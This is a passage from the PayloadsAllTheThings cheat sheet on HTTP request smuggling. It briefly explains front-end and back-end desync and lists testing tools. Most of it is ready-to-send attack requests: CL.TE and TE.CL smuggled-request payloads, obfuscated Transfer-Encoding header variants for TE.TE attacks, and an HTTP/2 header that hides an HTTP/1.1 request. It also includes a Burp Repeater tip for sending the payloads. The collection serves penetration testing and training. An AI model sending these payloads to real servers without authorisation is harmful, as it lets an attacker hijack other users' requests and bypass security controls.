<!-- source: Request Smuggling/README.md | chunk 1/2 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

# Request Smuggling

> HTTP Request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [CL.TE Vulnerabilities](#clte-vulnerabilities)
    * [TE.CL Vulnerabilities](#tecl-vulnerabilities)
    * [TE.TE Vulnerabilities](#tete-vulnerabilities)
    * [HTTP/2 Request Smuggling](#http2-request-smuggling)
    * [Client-Side Desync](#client-side-desync)
* [Labs](#labs)
* [References](#references)

## Tools

* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - An extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks
* [defparam/Smuggler](https://github.com/defparam/smuggler) - An HTTP Request Smuggling / Desync testing tool written in Python 3
* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - This tool is developed for burp suite practitioner certificate exam and HTTP Request Smuggling labs.

## Methodology

If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as PortSwigger suggests `Manually fixing the length fields in request smuggling attacks can be tricky.`.

### CL.TE Vulnerabilities

> The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Example:

```powershell
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL Vulnerabilities

> The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

Example:

```powershell
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```

:warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.You need to include the trailing sequence `\r\n\r\n` following the final 0.

### TE.TE Vulnerabilities

> The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

```powershell
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

## HTTP/2 Request Smuggling

HTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header

```ps1
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```
